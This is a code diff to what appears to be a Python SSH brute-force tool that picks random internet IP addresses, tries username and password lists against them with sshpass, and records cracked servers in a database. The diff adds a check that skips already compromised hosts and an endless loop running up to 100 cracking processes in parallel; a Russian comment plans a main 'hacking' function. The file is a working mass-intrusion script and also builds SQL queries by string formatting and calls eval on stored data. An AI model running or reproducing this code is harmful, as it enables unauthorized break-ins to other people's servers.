@@ -13,9 +13,12 @@ def get_random_ip_address():
     min_ip_part=0
     max_ip_part=255
     ip_part_1 = randint(min_ip_part, max_ip_part)
+    if ip_part_1 in [0, 127, 192]:
+        return get_random_ip_address()
     ip_part_2 = randint(min_ip_part, max_ip_part)
     ip_part_3 = randint(min_ip_part, max_ip_part)
     ip_part_4 = randint(min_ip_part, max_ip_part)
+
     return f"{ip_part_1}.{ip_part_2}.{ip_part_3}.{ip_part_4}"
 
 def write_data_to_text_file(data_line):
@@ -61,7 +64,8 @@ def save_ip_list_with_check(servers):
             print(ip, 'ADDED')
 
 def connect(ip, login, password):
-    return os.system(f"timeout 6s sshpass -p {password} ssh {login}@{ip} -o StrictHostKeyChecking=no 'ls' > /dev/null 2>&1")
+    # return os.system(f"timeout 6s sshpass -p {password} ssh {login}@{ip} -o StrictHostKeyChecking=no 'ls' > /dev/null 2>&1")
+    return os.system(f"timeout 6s sshpass -p {password} ssh {login}@{ip} -o StrictHostKeyChecking=no 'ls'")
 
 def get_list_all_servers():
     con = get_connect_db()
@@ -95,6 +99,13 @@ def update_data_in_servers(ip, login, password, attempts, status, is_my):
     con.commit()
     con.close()
 
+def is_hacked_server(ip):
+    con = get_connect_db()
+    is_my = con.cursor().execute(f"select is_my from servers where ip ='{ip}'").fetchone()[0]
+    con.close()
+    return eval(is_my)
+
+
 def crack():
     servers = get_list_servers_for_hack()
     logins = open('logins.txt', 'r').read().splitlines()
@@ -113,6 +124,8 @@ def crack():
                     if result == 0:
                         update_data_in_servers(ip, login, password, attempts, result, 'True')
 def crack_server(ip):
+    if is_hacked_server(ip):
+        return None
     attempts = get_attempts(ip)
     logins = open('logins.txt', 'r').read().splitlines()
     passwords = open('passwords.txt', 'r').read().splitlines()
@@ -138,7 +151,7 @@ def crack_server(ip):
 if __name__ == '__main__':
     init_database()
     n=500
-    multiprocessing.Pool(processes=n).map(get_hackability_servers, range(n))
+    # multiprocessing.Pool(processes=n).map(get_hackability_servers, range(n))
     # save_hackability_server('61.104.24.189', 1280, 'a:123')
     # init_csv_file('ip;login;password;status;is_my;datetime;attempts')
     # start = datetime.now()
@@ -173,13 +186,16 @@ if __name__ == '__main__':
     # print(multiprocessing.current_process().name)
     # print(multiprocessing.active_children())
 
-    
-    # servers = get_list_servers_for_hack()
-    # for ip in servers:
-    #     if len(multiprocessing.active_children()) < 10:
-    #         if ip not in [p.name for p in multiprocessing.active_children()]:
-    #             multiprocessing.Process(target=crack_server, args=(ip,), name=ip).start()
-    #             print(len(multiprocessing.active_children()), [p.name for p in multiprocessing.active_children()])
+    # содать главную функцию взлома с парсом серверов, сделать очередь со строками sql запросов и после попыток взлома всех сервов записать в бд данные
+    while True:
+        servers = get_list_servers_for_hack()
+        for ip in servers:
+            if len(multiprocessing.active_children()) < 100:
+                if ip not in [p.name for p in multiprocessing.active_children()]:
+                    sleep(0.3)
+                    multiprocessing.Process(target=crack_server, args=(ip,), name=ip).start()
+                    # print(len(multiprocessing.active_children()), [p.name for p in multiprocessing.active_children()])
+                    print(len(multiprocessing.active_children()))
 
     # l=['a', 'b']
 
